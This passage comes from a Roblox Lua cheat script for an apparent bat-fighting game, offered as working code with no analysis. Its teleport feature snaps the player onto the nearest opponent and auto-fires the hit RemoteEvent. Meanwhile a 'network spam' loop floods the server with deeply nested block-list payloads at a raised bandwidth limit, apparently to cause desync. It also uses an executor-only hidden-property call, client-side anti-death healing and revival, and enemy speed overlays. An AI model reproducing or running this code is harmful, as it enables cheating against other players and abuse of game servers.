                if katanaState.ExactTemplates[skinName] then
                    return katanaState.ExactTemplates[skinName]
                end
                if katanaState.ExactTemplateSearched[skinName] then return nil end
                katanaState.ExactTemplateSearched[skinName] = true
                local t = loadAssetSkinTemplate(skinName) or findExistingSkinTemplate(skinName)
                if t then katanaState.ExactTemplates[skinName] = t end
                return t
            end
            local normalizeSkinModel = nil
            normalizeSkinModel = function(source, parent)
                if source:IsA("Model") then
                    source.Name = "FlowerSkin_AssetKatana"
                    source.Parent = parent
                    return source
                end
                if source:IsA("BasePart") then
                    local model = Instance.new("Model")
                    model.Name = "FlowerSkin_AssetKatana"
                    model.Parent = parent
                    source.Parent = model
                    return model
                end
                if source:IsA("Tool") or source:IsA("Folder") then
                    local fk = source:FindFirstChild("FlowerSkin_AssetKatana")
                        or source:FindFirstChildWhichIsA("Model")
                        or source:FindFirstChildWhichIsA("BasePart")
                    if fk and fk.Parent == source then
                        fk.Parent = nil
                        source:Destroy()
                        return normalizeSkinModel(fk, parent)
                    end
                    local model = Instance.new("Model")
                    model.Name = "FlowerSkin_AssetKatana"
                    model.Parent = parent
                    for _, c in ipairs(source:GetChildren()) do
                        if not isScriptInstance(c) then c.Parent = model end
                    end
                    source:Destroy()
                    return model
                end
                return nil
            end
            local function applyExactSkinTemplate(batTool, skinName)
                local h = batTool and batTool:FindFirstChild("Handle")
                if not h or not h:IsA("BasePart") then return false end
                local template = getSkinTemplate(skinName)
                if not template then return false end
                local folder = Instance.new("Folder")
                folder.Name = "FlowerSkin_KatanaRealistic"
                folder.Parent = batTool
                local model = normalizeSkinModel(template:Clone(), folder)
                if not model or not hasBasePart(model) then
                    folder:Destroy()
                    return false
                end
                removeScripts(model)
                pcall(function() model:SetAttribute("CursedBatSkinsExactMesh", true) end)
                local firstPart = nil
                for _, d in ipairs(model:GetDescendants()) do
                    if d:IsA("BasePart") then
                        firstPart = firstPart or d
                        configureVisualPart(d)
                    end
                end
                if not firstPart then folder:Destroy(); return false end
                if model:IsA("Model") then
                    model.PrimaryPart = model.PrimaryPart or firstPart
                    pcall(function() model:PivotTo(h.CFrame) end)
                end
                for _, d in ipairs(model:GetDescendants()) do
                    if d:IsA("BasePart") then weldToHandle(d, h) end
                end
                local weaponPart = model:FindFirstChild("SharpParts", true)
                    or model:FindFirstChild("WeaponPart", true)
                    or model:FindFirstChild("Handle", true)
                    or firstPart
                if weaponPart and not weaponPart:FindFirstChild("FlowerSkin_ExtraRedVFX") then
                    addKatanaRedEffects(weaponPart)
                end
                return true
            end
            local function createProceduralKatana(batTool, skinName)
                local h = batTool and batTool:FindFirstChild("Handle")
                if not h or not h:IsA("BasePart") then return nil end
                local folder = Instance.new("Folder")
                folder.Name = "FlowerSkin_KatanaRealistic"
                folder.Parent = batTool
                local model = Instance.new("Model")
                model.Name = "FlowerSkin_AssetKatana"
                model:SetAttribute("CursedBatSkinsGenerated", true)
                model.Parent = folder
                local createdParts = {}
                local function createPart(name, size, cfo, color, material)
                    local p, o = createKatanaPart(model, name, size, cfo, color, material)
                    p.CFrame = h.CFrame * o
                    weldToHandle(p, h)
                    table.insert(createdParts, p)
                    return p
                end
                if skinName == "KATANA" then
                    local metal = Enum.Material.Metal
                    createPart("Handle2", Vector3.new(0.22, 1, 0.22), CFrame.new(0, -0.48, 0), Color3.new(0.176471, 0.176471, 0.045), metal)
                    local r2 = katanaColors.red2
                    local neon = Enum.Material.Neon
                    local sharpParts = createPart("SharpParts", Vector3.new(0.18, 2.4, 0.12), CFrame.new(0, 1.05, 0), r2, neon)
                    local red = katanaColors.red
                    local neon2 = Enum.Material.Neon
                    createPart("WeaponPart", Vector3.new(0.3, 2.7, 0.08), CFrame.new(0.08, 1.15, 0), red, neon2)
                    local gold = katanaColors.gold
                    local neon3 = Enum.Material.Neon
                    createPart("GoldAccent", Vector3.new(0.5, 0.12, 0.08), CFrame.new(0, -0.28, 0), gold, neon3)
                    addKatanaRedEffects(sharpParts)
                end
                model.PrimaryPart = createdParts[1]
                return model
            end
            local slashSoundIds = { KATANA = "rbxassetid://111808555599832" }
            return {
                State = katanaState,
                ApplySkin = function(skinName)
                    captureOriginalKatanaTemplate()
                    local lastBat = findBat()
                    if not lastBat then
                        katanaState.LastBat = nil
                        katanaState.LastAppliedSkin = nil
                        return false
                    end
                    cacheOriginalBatState(lastBat)
                    restoreOriginalBatVisual(lastBat)
                    if skinName == "NONE" then
                        katanaState.LastBat = lastBat
                        katanaState.LastAppliedSkin = skinName
                        return true
                    end
                    setBatHandleHidden(lastBat, true)
                    setBatSlashSound(lastBat, slashSoundIds[skinName])
                    if not applyExactSkinTemplate(lastBat, skinName) then
                        createProceduralKatana(lastBat, skinName)
                    end
                    local h = lastBat:FindFirstChild("Handle")
                    if h then
                        local fire = h:FindFirstChildOfClass("Fire") or h:FindFirstChild("Fire")
                        if fire and fire:IsA("Fire") then
                            fire.Enabled = true
                            fire.Color = katanaColors.red
                            fire.SecondaryColor = katanaColors.red2
                        end
                    end
                    katanaState.LastBat = lastBat
                    katanaState.LastAppliedSkin = skinName
                    return true
                end,
                SetExactAssetId = function(assetId)
                    katanaState.ExactAssetIds.KATANA = tostring(assetId or "")
                    katanaState.ExactTemplateSearched.KATANA = nil
                    katanaState.ExactTemplates.KATANA = nil
                end,
            }
        end
        katanaSkinController = createKatanaSkinController()
    end
    _G.CursedBatKatana = katanaSkinController
    _G.YoutKatanaSkin = katanaSkinController
    
    task.spawn(function()
        while true do
            if katanaSkinEnabled then
                local c = LP.Character
                local bat = nil
                if c then
                    bat = c:FindFirstChild("Bat")
                    if not (bat and bat:IsA("Tool")) then bat = nil end
                end
                local needsRefresh
                if not bat then
                    local bp = LP:FindFirstChildOfClass("Backpack")
                    if bp then
                        local b2 = bp:FindFirstChild("Bat")
                        if b2 and b2:IsA("Tool") then needsRefresh = b2 else needsRefresh = bat end
                    else
                        needsRefresh = bat
                    end
                else
                    needsRefresh = bat
                end
                needsRefresh = needsRefresh and (
                    needsRefresh ~= katanaSkinController.State.LastBat
                    or katanaSkinController.State.LastAppliedSkin ~= "KATANA"
                )
                if needsRefresh then
                    pcall(function() katanaSkinController.ApplySkin("KATANA") end)
                end
            end
            task.wait(0.5)
        end
    end)
    
    -- Minecraft Bat Controller removed per user request
    
    -- =====================================================================
    -- [FROM CLEAN] FOV (Custom FOV + FOV Value)
    -- =====================================================================
    enableCustomFov = function()
        local cam = workspace.CurrentCamera
        if cam and origFOV == nil then origFOV = cam.FieldOfView end
        fovEnabled = true
        if cam then
            pcall(function() cam.FieldOfViewMode = Enum.FieldOfViewMode.Diagonal end)
            pcall(function() cam.FieldOfView = fovValue end)
        end
        if customFovConn then customFovConn:Disconnect(); customFovConn = nil end
        pcall(function() RunService:UnbindFromRenderStep(CUSTOM_FOV_BIND) end)
        local prio = 200
        pcall(function() prio = Enum.RenderPriority.Camera.Value + 10 end)
        if not pcall(function()
            RunService:BindToRenderStep(CUSTOM_FOV_BIND, prio, function()
                if not fovEnabled then return end
                local c = workspace.CurrentCamera
                if c and c.FieldOfView ~= fovValue then c.FieldOfView = fovValue end
            end)
        end) then
            customFovConn = RunService.RenderStepped:Connect(function()
                if not fovEnabled then
                    if customFovConn then customFovConn:Disconnect(); customFovConn = nil end
                    return
                end
                local c = workspace.CurrentCamera
                if c then c.FieldOfView = fovValue end
            end)
        end
    end
    
    disableCustomFov = function()
        fovEnabled = false
        pcall(function() RunService:UnbindFromRenderStep(CUSTOM_FOV_BIND) end)
        if customFovConn then customFovConn:Disconnect(); customFovConn = nil end
        local cam = workspace.CurrentCamera
        if cam then
            pcall(function() cam.FieldOfViewMode = Enum.FieldOfViewMode.Vertical end)
            pcall(function() cam.FieldOfView = origFOV or 70 end)
        end
    end
    setFovVisual = nil
    fovSliderSet = nil
    
    -- =====================================================================
    -- [FROM CLEAN] TP BAT (Alvaro TP with network spam) - Replaces old TP BAT
    -- =====================================================================
    local desyncLoopRunning, networkSpamThread, startCharacterRecoveryLoop, stopCharacterRecoveryLoop, setOutgoingBandwidthLimit, sendBlockListPayload
    local batDesyncTpEnabled = false
    local batDesyncTpConn = nil
    local batDesyncTpSetVisual = nil
    
    _G.AlvaroTP = _G.AlvaroTP or {
        conn=nil,on=false,h=nil,hrp=nil,hittingCooldown=false,_charConn=nil,
    }
    desyncLoopRunning = false
    
    do
        local recoveryThread = nil
        networkSpamThread = nil
        local nestedPayloadCache, blockListPayloadCache = nil, nil
    
        startCharacterRecoveryLoop = function()
            if recoveryThread then return end
            recoveryThread = task.spawn(function()
                while batDesyncTpEnabled do
                    pcall(function()
                        local c = LP.Character
                        if not c then task.wait(0.1); return end
                        local h = c:FindFirstChildOfClass("Humanoid")
                        local r = c:FindFirstChild("HumanoidRootPart")
                        if h then
                            if h.Health <= 0 then h.Health = h.MaxHealth end
                            if h.PlatformStand then h.PlatformStand = false end
                            if h.Sit then h.Sit = false end
                            local st = h:GetState()
                            if st == Enum.HumanoidStateType.Physics
                                or st == Enum.HumanoidStateType.Ragdoll
                                or st == Enum.HumanoidStateType.FallingDown then
                                h:ChangeState(Enum.HumanoidStateType.GettingUp)
                                h:ChangeState(Enum.HumanoidStateType.Running)
                            end
                        end
                        if r and sethiddenproperty then
                            pcall(sethiddenproperty, r, "PhysicsRepRootPart", nil)
                        end
                        for _, d in ipairs(c:GetDescendants()) do
                            if d:IsA("BasePart") then d.CanCollide = false end
                        end
                    end)
                    task.wait(0.05)
                end
                recoveryThread = nil
            end)
        end
    
        stopCharacterRecoveryLoop = function()
            if recoveryThread then pcall(task.cancel, recoveryThread); recoveryThread = nil end
        end
    
        local function createNestedPayload()
            if nestedPayloadCache then return nestedPayloadCache end
            local root, cursor = {}, {}
            for i=1,12 do
                local t = {}; root[i]=t; cursor=t; root=t
            end
            nestedPayloadCache = root
            return root
        end
    
        local function createBlockListPayload()
            if blockListPayloadCache then return blockListPayloadCache end
            local nested = createNestedPayload()
            local b = table.create(800)
            for i=1,300 do b[i]=nested end
            blockListPayloadCache = b
            return b
        end
    
        setOutgoingBandwidthLimit = function(l)
            pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(l) end)
        end
    
        sendBlockListPayload = function()
            pcall(function()
                local ps = game:GetService("Players")
                if ps and ps:FindFirstChild("SetPlayerBlockList") then
                    ps.SetPlayerBlockList:FireServer(createBlockListPayload())
                end
            end)
        end
    end
    
    do
        local function startNetworkSpamLoop()
            if not networkSpamThread then
                networkSpamThread = task.spawn(function()
                    task.wait(0.05)
                    while batDesyncTpEnabled do
                        setOutgoingBandwidthLimit(12000)
                        sendBlockListPayload()
                        task.wait(0.15)
                    end
                    setOutgoingBandwidthLimit(0)
                    networkSpamThread = nil
                end)
            end
        end
        local function stopNetworkSpamLoop()
            if networkSpamThread then pcall(task.cancel, networkSpamThread); networkSpamThread = nil end
            setOutgoingBandwidthLimit(0)
        end
    
        local function findAndEquipBat()
            local c = LP.Character
            if not c then return nil end
            for _, t in ipairs(c:GetChildren()) do
                if t:IsA("Tool") then
                    local n = t.Name:lower()
                    if n:find("bat") or n:find("slap") then return t end
                end
            end
            local bp = LP:FindFirstChild("Backpack")
            if not bp then return nil end
            for _, t in ipairs(bp:GetChildren()) do
                if t:IsA("Tool") then
                    local n = t.Name:lower()
                    if n:find("bat") or n:find("slap") then
                        local h = c:FindFirstChildOfClass("Humanoid")
                        if h then pcall(function() h:EquipTool(t) end) end
                        return t
                    end
                end
            end
            return nil
        end
    
        local function tryHitBatDesync()
            if desyncLoopRunning then return end
            desyncLoopRunning = true
            pcall(function()
                local bat = findAndEquipBat()
                if not bat then return end
                bat:Activate()
                local re = bat:FindFirstChildWhichIsA("RemoteEvent")
                if re then re:FireServer() end
            end)
            task.delay(0.08, function() desyncLoopRunning = false end)
        end
    
        local function findNearestOpponent(rootPart)
            local cd, cp = math.huge, nil
            for _, p in ipairs(Players:GetPlayers()) do
                local c = p ~= LP and p.Character
                local r = c and c:FindFirstChild("HumanoidRootPart")
                local h = c and c:FindFirstChildOfClass("Humanoid")
                if r and h and h.Health > 0 then
                    local d = (rootPart.Position - r.Position).Magnitude
                    if d < cd then cd = d; cp = p end
                end
            end
            return cp, cd
        end
    
        local function teleportToTarget(hrp, targetRoot)
            pcall(function() if hrp.SetNetworkOwner then hrp:SetNetworkOwner(nil) end end)
            task.wait()
            hrp.CFrame = _CFnew(targetRoot.Position + _V3new(0, 2.5, 0))
            hrp.AssemblyLinearVelocity = targetRoot.AssemblyLinearVelocity
            pcall(function() if hrp.SetNetworkOwner then hrp:SetNetworkOwner(LP) end end)
        end
    
        local function updateBatDesyncTeleport()
            if not batDesyncTpEnabled then return end
            local c = LP.Character
            local hrp = c and c:FindFirstChild("HumanoidRootPart")
            local h = c and c:FindFirstChildOfClass("Humanoid")
            if not hrp or not h then return end
    
            local re = h:FindFirstChildOfClass("RemoteEvent")
            if re then
                pcall(function()
                    for _, t in ipairs(re:GetPlayingAnimationTracks()) do t:Stop() end
                end)
            end
    
            local bat = findAndEquipBat()
            if bat and bat.Parent ~= c then
                pcall(function() h:EquipTool(bat) end)
            end
    
            local player, dist = findNearestOpponent(hrp)
            if not player or dist > 100 then return end
            local tRoot = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
            if not tRoot then return end
    
            teleportToTarget(hrp, tRoot)
            local cam = workspace.CurrentCamera
            if cam then cam.CFrame = _CFnew(cam.CFrame.Position, tRoot.Position) end
            tryHitBatDesync()
    
            pcall(function()
                for _, d in ipairs(c:GetDescendants()) do
                    if d:IsA("BasePart") then d.CanCollide = false end
                end
            end)
        end
    
        startAlvaroTP = function()
            if batDesyncTpConn then batDesyncTpConn:Disconnect(); batDesyncTpConn = nil end
            batDesyncTpEnabled = true
            _G.AlvaroTP.on = true
            _G.AlvaroTP.conn = nil
            desyncLoopRunning = false
            local c = LP.Character
            if c then
                _G.AlvaroTP.h = c:FindFirstChildOfClass("Humanoid")
                _G.AlvaroTP.hrp = c:FindFirstChild("HumanoidRootPart")
            end
            batDesyncTpConn = RunService.Heartbeat:Connect(updateBatDesyncTeleport)
            _G.AlvaroTP.conn = batDesyncTpConn
            startCharacterRecoveryLoop()
            startNetworkSpamLoop()
            if batDesyncTpSetVisual then batDesyncTpSetVisual(true) end
            updateTpBatButtonWithAntiDie(true)
        end
    
        stopAlvaroTP = function()
            batDesyncTpEnabled = false
            _G.AlvaroTP.on = false
            if batDesyncTpConn then batDesyncTpConn:Disconnect(); batDesyncTpConn = nil end
            _G.AlvaroTP.conn = nil
            _G.AlvaroTP.hittingCooldown = false
            desyncLoopRunning = false
            stopCharacterRecoveryLoop()
            stopNetworkSpamLoop()
            local hrp = _G.AlvaroTP.hrp
            if hrp and hrp.Parent then
                pcall(function() if hrp.SetNetworkOwner then hrp:SetNetworkOwner(LP) end end)
            end
            if batDesyncTpSetVisual then batDesyncTpSetVisual(false) end
            updateTpBatButtonWithAntiDie(false)
        end
    end
    
    if _G.AlvaroTP._charConn then
        pcall(function() _G.AlvaroTP._charConn:Disconnect() end)
        _G.AlvaroTP._charConn = nil
    end
    do
        local function updateAlvaroCharacterReferences(character)
            task.wait(0.15)
            _G.AlvaroTP.h = character and character:FindFirstChildOfClass("Humanoid") or nil
            _G.AlvaroTP.hrp = character and character:FindFirstChild("HumanoidRootPart") or nil
            if batDesyncTpEnabled and not batDesyncTpConn then
                startAlvaroTP()
            end
        end
        _G.AlvaroTP._charConn = LP.CharacterAdded:Connect(function(character)
            pcall(function() updateAlvaroCharacterReferences(character) end)
        end)
        if LP.Character then
            task.spawn(function()
                pcall(function() updateAlvaroCharacterReferences(LP.Character) end)
            end)
        end
    end
    
    startBatDesyncTp = function()
        if not _G.AmbitiousSafeModeTryStart() then
            return
        end
        if batV2Enabled then
            disableBatV2()
            if batV2SetVisual then batV2SetVisual(false) end
            if _G.__YoutBatV2Frame then
                pcall(paintFloatingBtn, _G.__YoutBatV2Frame, false)
            end
        end
        if not unwalkEnabled then
            startUnwalk()
            unwalkEnabled = true
            isActive = true
            if setUnwalkVisual then setUnwalkVisual(true) end
        end
        startAlvaroTP()
    end
    
    stopBatDesyncTp = function()
        stopAlvaroTP()
        if isActive then
            stopUnwalk()
            unwalkEnabled = false
            isActive = false
            if setUnwalkVisual then setUnwalkVisual(false) end
        end
    end
    
    toggleBatDesyncTp = function()
        if batDesyncTpEnabled then
            stopBatDesyncTp()
        else
            disableAllAimbots()
            if autoLeftEnabled then
                autoLeftEnabled = false
                stopAutoLeft()
                if autoLeftSetVisual then autoLeftSetVisual(false) end
                if mobSetAutoLeft then mobSetAutoLeft(false) end
            end
            if autoRightEnabled then
                autoRightEnabled = false
                stopAutoRight()
                if autoRightSetVisual then autoRightSetVisual(false) end
                if mobSetAutoRight then mobSetAutoRight(false) end
            end
            startBatDesyncTp()
        end
        if batDesyncTpSetVisual then batDesyncTpSetVisual(batDesyncTpEnabled) end
        saveAllSettings()
    end
    
    function updateTpBatButtonWithAntiDie(state)
        if batDesyncTpSetVisual then batDesyncTpSetVisual(state) end
    end
    
    -- =====================================================================
    -- ANTI RAGDOLL
    -- =====================================================================
    local AntiRagdollV2 = {
        Enabled = false,
        Connection = nil,
        ResetCooldown = 0,
    }
    
    local function startAntiRagdollV2()
        if AntiRagdollV2.Connection then return end
        AntiRagdollV2.Enabled = true
        AntiRagdollV2.Connection = RunService.Heartbeat:Connect(function()
            if not AntiRagdollV2.Enabled then return end
            local char = LP.Character
            if not char then return end
            local hum = char:FindFirstChildOfClass("Humanoid")
            local root = char:FindFirstChild("HumanoidRootPart")
            if not hum or not root or hum.Health <= 0 then return end
            if dropActive or _G.IsDropping then return end
            local state = hum:GetState()
            local now = _tick()
            if state == Enum.HumanoidStateType.Physics or
               state == Enum.HumanoidStateType.Ragdoll or
               state == Enum.HumanoidStateType.FallingDown then
                if now - AntiRagdollV2.ResetCooldown > 0.15 then
                    AntiRagdollV2.ResetCooldown = now
                    pcall(function()
                        hum:ChangeState(Enum.HumanoidStateType.GettingUp)
                        root.Velocity = _V3zero
                        root.RotVelocity = _V3zero
                        root.AssemblyLinearVelocity = _V3zero
                        root.AssemblyAngularVelocity = _V3zero
                        for _, obj in ipairs(char:GetDescendants()) do
                            if obj:IsA("Motor6D") then obj.Enabled = true end
                            if obj:IsA("Constraint") then obj.Enabled = true end
                        end
                        workspace.CurrentCamera.CameraSubject = hum
                        local PM = LP.PlayerScripts:FindFirstChild("PlayerModule")
                        if PM then
                            local CM = require(PM:FindFirstChild("ControlModule"))
                            if CM then CM:Enable() end
                        end
                        hum.AutoRotate = true
                        hum.PlatformStand = false
                        hum.Sit = false
                    end)
                end
            end
        end)
    end
    
    local function stopAntiRagdollV2()
        AntiRagdollV2.Enabled = false
        if AntiRagdollV2.Connection then
            AntiRagdollV2.Connection:Disconnect()
            AntiRagdollV2.Connection = nil
        end
        AntiRagdollV2.ResetCooldown = 0
    end
    
    LP.CharacterAdded:Connect(function()
        task.wait(0.5)
        if antiRagdollMode == "v2" then
            if AntiRagdollV2.Connection then
                AntiRagdollV2.Connection:Disconnect()
                AntiRagdollV2.Connection = nil
            end
            startAntiRagdollV2()
        end
    end)
    
    function setAntiRagdollMode(mode)
        if mode == "v2" then
            startAntiRagdollV2()
            antiRagdollMode = "v2"
        else
            stopAntiRagdollV2()
            antiRagdollMode = "off"
        end
        if setAntiRagVisual then setAntiRagVisual(antiRagdollMode == "v2") end
        saveAllSettings()
    end
    
    -- =====================================================================
    -- [FIX ANTI DIE VIOLETTE v2]
    -- =====================================================================
    _antiDieEnabled = false
    _antiDieStopped = false
    _antiDieSources = { toggle = false, autobat = false }
    
    _antiDie = {
        enabled = false, loop = nil, healthConn = nil, charConn = nil,
        lastHealTime = 0, invincibleUntil = 0,
        config = {
            healthThreshold = 50,
            invincibilityFrames = 0.75,
            fallDamageProtection = false,
            ragdollProtection = true,
            autoRevive = true,
        },
    }
    
    function _antiDie.SuperHeal(hum)
        if not hum or not hum.Parent then return end
        local maxHealth = hum.MaxHealth or 100
        if maxHealth <= 0 or maxHealth == math.huge then maxHealth = 100 end
        pcall(function()
            hum.Health = maxHealth
            if hum.MaxHealth < maxHealth then hum.MaxHealth = maxHealth end
        end)
        _antiDie.invincibleUntil = _tick() + _antiDie.config.invincibilityFrames
        _antiDie.lastHealTime = _tick()
        pcall(function()
            local char = hum.Parent
            if not char then return end
            for _, child in ipairs(char:GetChildren()) do
                if child:IsA("NumberValue") then
                    local name = child.Name:lower()
                    if name:find("health") or name:find("hp") or name:find("life") then
                        child.Value = maxHealth
                    end
                end
                if child:IsA("BoolValue") and child.Name:lower():find("dead") then
                    child.Value = false
                end
            end
        end)
    end
    
    function _antiDie.PreventDamage(root, hum)
        if not hum then return end
        if hum.Health < (hum.MaxHealth or 100) then _antiDie.SuperHeal(hum) end
        if _tick() < _antiDie.invincibleUntil then
            if hum.Health < (hum.MaxHealth or 100) then
                hum.Health = hum.MaxHealth or 100
            end
        end
        if _antiDie.config.ragdollProtection then
            local state = hum:GetState()
            if state == Enum.HumanoidStateType.Physics or
               state == Enum.HumanoidStateType.Ragdoll or
               state == Enum.HumanoidStateType.FallingDown or
               state == Enum.HumanoidStateType.Dead then
                pcall(function()
                    hum:ChangeState(Enum.HumanoidStateType.GettingUp)
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                end)
                _antiDie.SuperHeal(hum)
                if root then
                    pcall(function() root.AssemblyAngularVelocity = Vector3.zero end)
                end
            end
        end
        if hum.Health <= 0 then
            _antiDie.SuperHeal(hum)
            pcall(function()
                hum:ChangeState(Enum.HumanoidStateType.GettingUp)
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end)
            if root then
                pcall(function()
                    root.CFrame = CFrame.new(root.Position + Vector3.new(0, 2, 0))
                    root.AssemblyLinearVelocity = Vector3.zero
                end)
            end
        end
    end
    
    function _antiDie.AutoRevive()
        if not _antiDie.config.autoRevive then return end
        local char = LP.Character
        if not char then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        local root = char:FindFirstChild("HumanoidRootPart")
        if not hum then return end
        if hum.Health <= 0 then
            _antiDie.SuperHeal(hum)
            pcall(function()
                hum:ChangeState(Enum.HumanoidStateType.GettingUp)
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end)
            if root then
                pcall(function()
                    root.CFrame = CFrame.new(root.Position + Vector3.new(0, 3, 0))
                    root.AssemblyLinearVelocity = Vector3.zero
                end)
            end
        end
    end
    
    function _antiDie.AttachHealth(char)
        if _antiDie.healthConn then _antiDie.healthConn:Disconnect(); _antiDie.healthConn = nil end
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not hum then hum = char and char:WaitForChild("Humanoid", 3) end
        if not hum then return end
        _antiDie.healthConn = hum:GetPropertyChangedSignal("Health"):Connect(function()
            if not _antiDie.enabled then return end
            if hum.Health < (hum.MaxHealth or 100) then _antiDie.SuperHeal(hum) end
            if hum.Health <= 0 then _antiDie.AutoRevive() end
        end)
        if hum.Health < (hum.MaxHealth or 100) then _antiDie.SuperHeal(hum) end
    end
    
    function _antiDie.StartEngine()
        if _antiDie.enabled and _antiDie.loop then return end
        _antiDie.enabled = true
        _antiDieEnabled = true
        antiDieEnabled = true
        if _antiDie.loop then _antiDie.loop:Disconnect(); _antiDie.loop = nil end
        if _antiDie.healthConn then _antiDie.healthConn:Disconnect(); _antiDie.healthConn = nil end
        _antiDie.loop = RunService.Heartbeat:Connect(function()
            if not _antiDie.enabled then return end
            local char = LP.Character
            if not char then return end
            local hum = char:FindFirstChildOfClass("Humanoid")
            local root = char:FindFirstChild("HumanoidRootPart")
            if not hum then return end
            if hum.Health <= 0 then _antiDie.AutoRevive()
            elseif hum.Health <= _antiDie.config.healthThreshold then _antiDie.SuperHeal(hum)
            elseif hum.Health < (hum.MaxHealth or 100) then _antiDie.SuperHeal(hum) end
            _antiDie.PreventDamage(root, hum)
        end)
        if LP.Character then _antiDie.AttachHealth(LP.Character) end
        if _antiDie.charConn then _antiDie.charConn:Disconnect(); _antiDie.charConn = nil end
        _antiDie.charConn = LP.CharacterAdded:Connect(function(char)
            if not _antiDie.enabled then return end
            task.wait(0.05)
            _antiDie.AttachHealth(char)
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then _antiDie.SuperHeal(hum) end
        end)
    end
    
    function _antiDie.StopEngine()
        _antiDie.enabled = false
        _antiDieEnabled = false
        antiDieEnabled = false
        if _antiDie.loop then _antiDie.loop:Disconnect(); _antiDie.loop = nil end
        if _antiDie.healthConn then _antiDie.healthConn:Disconnect(); _antiDie.healthConn = nil end
        if _antiDie.charConn then _antiDie.charConn:Disconnect(); _antiDie.charConn = nil end
        pcall(function()
            local char = LP.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if not hum then return end
            hum:SetStateEnabled(Enum.HumanoidStateType.Dead, true)
            hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
            hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
            hum.BreakJointsOnDeath = true
            if hum.MaxHealth == math.huge or hum.MaxHealth <= 0 then
                hum.MaxHealth = 100
                hum.Health = math.min(hum.Health, 100)
            end
        end)
    end
    
    function _antiDieSetEnabled(enabled)
        enabled = enabled == true
        if enabled == _antiDieEnabled then return end
        if enabled then
            _antiDie.StartEngine()
        else
            _antiDie.StopEngine()
        end
    end
    
    function _antiDieRefresh()
        if _antiDieStopped then return end
        local manual = _antiDieSources.toggle
        _antiDieSetEnabled(manual or _antiDieSources.autobat)
    end
    
    _G.__CrystalAntiDieSource = function(source, enabled)
        if _antiDieStopped or _antiDieSources[source] == nil then return end
        _antiDieSources[source] = enabled == true
        _antiDieRefresh()
    end
    
    _G.__CrystalAntiDieSet = function(enabled)
        _G.__CrystalAntiDieSource("autobat", enabled)
    end
    
    _G.__CrystalAntiDieIsEnabled = function() return _antiDieEnabled end
    _G.__CrystalAntiDieStop = function()
        _antiDieStopped = true
        _antiDieSources.toggle = false
        _antiDieSources.autobat = false
        _antiDieSetEnabled(false)
    end
    
    function activateOnCharacter(char)
        if not _antiDieEnabled then return end
        _antiDie.AttachHealth(char)
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum then _antiDie.SuperHeal(hum) end
    end
    
    AntiDieModule = {
        enabled = false,
        start = function()
            AntiDieModule.enabled = true
            antiDieEnabled = true
            _antiDieStopped = false
            _G.__CrystalAntiDieSource("toggle", true)
        end,
        stop = function()
            AntiDieModule.enabled = false
            antiDieEnabled = false
            _G.__CrystalAntiDieSource("toggle", false)
        end,
    }
    _G.AntiDie = AntiDieModule
    
    -- =====================================================================
    -- ANTI FLING
    -- =====================================================================
    setAntiFlingVisual = nil
    
    local _antiFlingState = {
        connection    = nil,
        threshold     = 80,
        spinThreshold = 40,
    }
    local _ANTI_FLING_DRIVE_GRACE = 0.3
    
    local function _afHubSpeedLive()
        local live = _G.__YoutLiveSpeed
        if type(live) ~= "table" then return false end
        local stamp, speed = tonumber(live.t), tonumber(live.v)
        if not stamp or not speed or speed <= 0 then return false end
        return (os.clock() - stamp) <= _ANTI_FLING_DRIVE_GRACE
    end
    
    local function _afOwnMoverActive()
        if batDesyncTpEnabled then return true end
        if autoBatEnabled then return true end
        if autoLeftEnabled or autoRightEnabled then return true end
        if autoBatV2Enabled then return true end
        return false
    end
    
    function startAntiFling()
        if _antiFlingState.connection then return end
        antiFlingEnabled = true
        _antiFlingState.connection = RunService.Heartbeat:Connect(function()
            if not antiFlingEnabled then return end
            local character = LP.Character
            if not character then return end
            local root = character:FindFirstChild("HumanoidRootPart")
            if not root then return end
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if humanoid and (humanoid.Health <= 0 or humanoid.SeatPart) then return end
    
            if dropActive or _G.IsDropping then return end
            if _afOwnMoverActive() then return end
            if _afHubSpeedLive() then return end
    
            local velocity = root.AssemblyLinearVelocity
            local flat = Vector3.new(velocity.X, 0, velocity.Z)
    
            if flat.Magnitude > _antiFlingState.threshold then
                pcall(function()
                    root.AssemblyLinearVelocity = Vector3.new(0, velocity.Y, 0)
                    root.AssemblyAngularVelocity = Vector3.zero
                end)
                return
            end
            if root.AssemblyAngularVelocity.Magnitude > _antiFlingState.spinThreshold then
                pcall(function() root.AssemblyAngularVelocity = Vector3.zero end)
            end
        end)
    end
    
    function stopAntiFling()
        antiFlingEnabled = false
        if _antiFlingState.connection then
            _antiFlingState.connection:Disconnect()
            _antiFlingState.connection = nil
        end
    end
    
    LP.CharacterAdded:Connect(function()
        task.wait(0.3)
        if antiFlingEnabled then startAntiFling() end
    end)
    
    local _enemySpeedAcc = 0
    function updateEnemySpeedLabels()
        _enemySpeedAcc = _enemySpeedAcc + 1
        if _enemySpeedAcc < 6 then return end
        _enemySpeedAcc = 0
        local color = getThemeColor()
        local players = _GetPlayersCached()
        for i = 1, #players do
            local player = players[i]
            if player ~= LP then
                local char = player.Character
                local hrp = char and char:FindFirstChild("HumanoidRootPart")
                local hum = char and char:FindFirstChildOfClass("Humanoid")
                if hrp and hum and hum.Health > 0 then
                    local v = hrp.AssemblyLinearVelocity
                    local speed = _sqrt(v.X*v.X + v.Z*v.Z)
                    local label = enemySpeedLabels[player]
                    if not label then
                        local head = char:FindFirstChild("Head")
                        if head then
                            local bb = Instance.new("BillboardGui")
                            bb.Size = UDim2.new(0, 100, 0, 25)
                            bb.StudsOffset = _V3new(0, 5.5, 0)
                            bb.AlwaysOnTop = true
                            bb.Name = "EnemySpeedGui"
                            bb.Parent = head
                            local tl = Instance.new("TextLabel", bb)
                            tl.Size = UDim2.new(1, 0, 1, 0)
                            tl.BackgroundTransparency = 1
                            tl.TextColor3 = color
                            tl.Font = Enum.Font.GothamBold
                            tl.TextScaled = true
                            tl.TextStrokeTransparency = 0
